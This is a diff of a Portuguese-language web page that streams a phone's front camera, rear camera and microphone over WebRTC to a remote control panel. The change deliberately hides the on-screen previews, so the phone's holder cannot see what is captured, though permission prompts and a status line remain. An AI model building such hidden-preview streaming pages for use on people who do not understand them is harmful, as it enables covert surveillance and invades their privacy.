@@ -3,171 +3,285 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Câmera</title>
+    <title>Transmissão</title>
 </head>
 
 <body>
 
-    <h1>Câmera</h1>
+    <h1>Transmissão autorizada</h1>
 
     <p id="status">Conectando ao servidor...</p>
 
-    <video
-        id="video"
-        autoplay
-        playsinline
-        muted
-        width="400">
-    </video>
+    <!-- As imagens ficam ocultas no celular -->
+    <video id="frontPreview" autoplay playsinline muted hidden></video>
+    <video id="rearPreview" autoplay playsinline muted hidden></video>
 
-    <script>
-        const video = document.getElementById("video");
-        const status = document.getElementById("status");
+<script>
 
-        const socket = new WebSocket(
-            "wss://casaco-mercedes.onrender.com"
-        );
+const status = document.getElementById("status");
 
-        let peer = null;
-        let stream = null;
+const socket = new WebSocket(
+    "wss://casaco-mercedes.onrender.com"
+);
 
-        socket.onopen = async () => {
+let peer = null;
 
-            status.textContent =
-                "Conectado. Solicitando câmera e microfone...";
+let frontStream = null;
+let rearStream = null;
+let audioStream = null;
+
+socket.onopen = async () => {
+
+    status.textContent =
+        "Conectado. Solicitando câmera e microfone...";
+
+    socket.send(JSON.stringify({
+        tipo: "camera"
+    }));
+
+    try {
+
+        // Câmera frontal
+        frontStream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: "user"
+            },
+            audio: false
+        });
+
+        // Câmera traseira
+        rearStream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: {
+                    exact: "environment"
+                }
+            },
+            audio: false
+        });
+
+        // Microfone
+        audioStream = await navigator.mediaDevices.getUserMedia({
+            video: false,
+            audio: true
+        });
+
+        document.getElementById("frontPreview").srcObject =
+            frontStream;
+
+        document.getElementById("rearPreview").srcObject =
+            rearStream;
+
+        iniciarWebRTC();
+
+        status.textContent =
+            "Câmeras e microfone autorizados. Transmissão ativa.";
+
+    } catch (erro) {
+
+        console.error(erro);
+
+        status.textContent =
+            "O aparelho não permitiu acessar as duas câmeras e o microfone.";
+    }
+};
+
+
+function iniciarWebRTC() {
+
+    peer = new RTCPeerConnection({
+
+        iceServers: [
+            {
+                urls: "stun:stun.l.google.com:19302"
+            }
+        ]
+
+    });
+
+
+    // FRONTAL
+    const frontTrack =
+        frontStream.getVideoTracks()[0];
+
+    const frontOnlyStream =
+        new MediaStream([frontTrack]);
+
+    peer.addTrack(
+        frontTrack,
+        frontOnlyStream
+    );
+
+
+    // TRASEIRA
+    const rearTrack =
+        rearStream.getVideoTracks()[0];
+
+    const rearOnlyStream =
+        new MediaStream([rearTrack]);
+
+    peer.addTrack(
+        rearTrack,
+        rearOnlyStream
+    );
+
+
+    // ÁUDIO
+    const audioTrack =
+        audioStream.getAudioTracks()[0];
+
+    const audioOnlyStream =
+        new MediaStream([audioTrack]);
+
+    peer.addTrack(
+        audioTrack,
+        audioOnlyStream
+    );
+
+
+    peer.onicecandidate = evento => {
+
+        if (evento.candidate) {
 
             socket.send(JSON.stringify({
-                tipo: "camera"
+
+                tipo: "candidato",
+
+                candidato: evento.candidate
+
             }));
 
-            try {
-
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: "user"
-                    },
-                    audio: true
-                });
-
-                video.srcObject = stream;
-
-                status.textContent =
-                    "Câmera e microfone autorizados.";
-
-                iniciarWebRTC();
-
-            } catch (erro) {
-
-                console.error(erro);
-
-                status.textContent =
-                    "Permissão da câmera ou microfone recusada.";
-            }
-        };
-
-        function iniciarWebRTC() {
-
-            peer = new RTCPeerConnection({
-                iceServers: [
-                    {
-                        urls: "stun:stun.l.google.com:19302"
-                    }
-                ]
-            });
-
-            stream.getTracks().forEach(track => {
-                peer.addTrack(track, stream);
-            });
-
-            peer.onicecandidate = evento => {
-
-                if (evento.candidate) {
-
-                    socket.send(JSON.stringify({
-                        tipo: "candidato",
-                        candidato: evento.candidate
-                    }));
-                }
-            };
         }
 
-        socket.onmessage = async evento => {
+    };
 
-            const mensagem = JSON.parse(evento.data);
+}
 
-            if (mensagem.tipo === "painel-pronto") {
 
-                if (!peer) return;
+socket.onmessage = async evento => {
 
-                const oferta =
-                    await peer.createOffer();
+    const mensagem =
+        JSON.parse(evento.data);
 
-                await peer.setLocalDescription(oferta);
 
-                socket.send(JSON.stringify({
-                    tipo: "oferta",
-                    oferta: peer.localDescription
-                }));
-            }
+    if (mensagem.tipo === "painel-pronto") {
 
-            if (mensagem.tipo === "resposta") {
+        if (!peer) return;
 
-                if (!peer) return;
+        const oferta =
+            await peer.createOffer();
 
-                await peer.setRemoteDescription(
-                    mensagem.resposta
-                );
-            }
+        await peer.setLocalDescription(oferta);
 
-            if (mensagem.tipo === "candidato") {
+        socket.send(JSON.stringify({
 
-                if (!peer) return;
+            tipo: "oferta",
 
-                try {
-                    await peer.addIceCandidate(
-                        mensagem.candidato
-                    );
-                } catch (erro) {
-                    console.error(erro);
-                }
-            }
+            oferta: peer.localDescription
 
-            if (mensagem.tipo === "encerrar") {
+        }));
 
-                if (stream) {
+    }
 
-                    stream.getTracks().forEach(track => {
-                        track.stop();
-                    });
-                }
 
-                if (peer) {
-                    peer.close();
-                }
+    if (mensagem.tipo === "resposta") {
 
-                video.srcObject = null;
+        if (!peer) return;
 
-                status.textContent =
-                    "Transmissão encerrada pelo painel.";
-            }
-        };
+        await peer.setRemoteDescription(
+            mensagem.resposta
+        );
 
-        socket.onerror = () => {
+    }
 
-            status.textContent =
-                "Erro ao conectar ao servidor.";
-        };
 
-        socket.onclose = () => {
+    if (mensagem.tipo === "candidato") {
 
-            if (status.textContent !==
-                "Transmissão encerrada pelo painel.") {
+        if (!peer) return;
 
-                status.textContent =
-                    "Conexão com o servidor encerrada.";
-            }
-        };
-    </script>
+        try {
+
+            await peer.addIceCandidate(
+                mensagem.candidato
+            );
+
+        } catch (erro) {
+
+            console.error(erro);
+
+        }
+
+    }
+
+
+    if (mensagem.tipo === "encerrar") {
+
+        encerrarTudo();
+
+    }
+
+};
+
+
+function encerrarTudo() {
+
+    if (frontStream) {
+
+        frontStream.getTracks().forEach(
+            track => track.stop()
+        );
+
+    }
+
+    if (rearStream) {
+
+        rearStream.getTracks().forEach(
+            track => track.stop()
+        );
+
+    }
+
+    if (audioStream) {
+
+        audioStream.getTracks().forEach(
+            track => track.stop()
+        );
+
+    }
+
+    if (peer) {
+
+        peer.close();
+
+    }
+
+    status.textContent =
+        "Transmissão encerrada pelo painel.";
+
+}
+
+
+socket.onerror = () => {
+
+    status.textContent =
+        "Erro ao conectar ao servidor.";
+
+};
+
+
+socket.onclose = () => {
+
+    if (
+        !status.textContent.includes("encerrada")
+    ) {
+
+        status.textContent =
+            "Conexão com o servidor encerrada.";
+
+    }
+
+};
+
+</script>
 
 </body>
 </html>
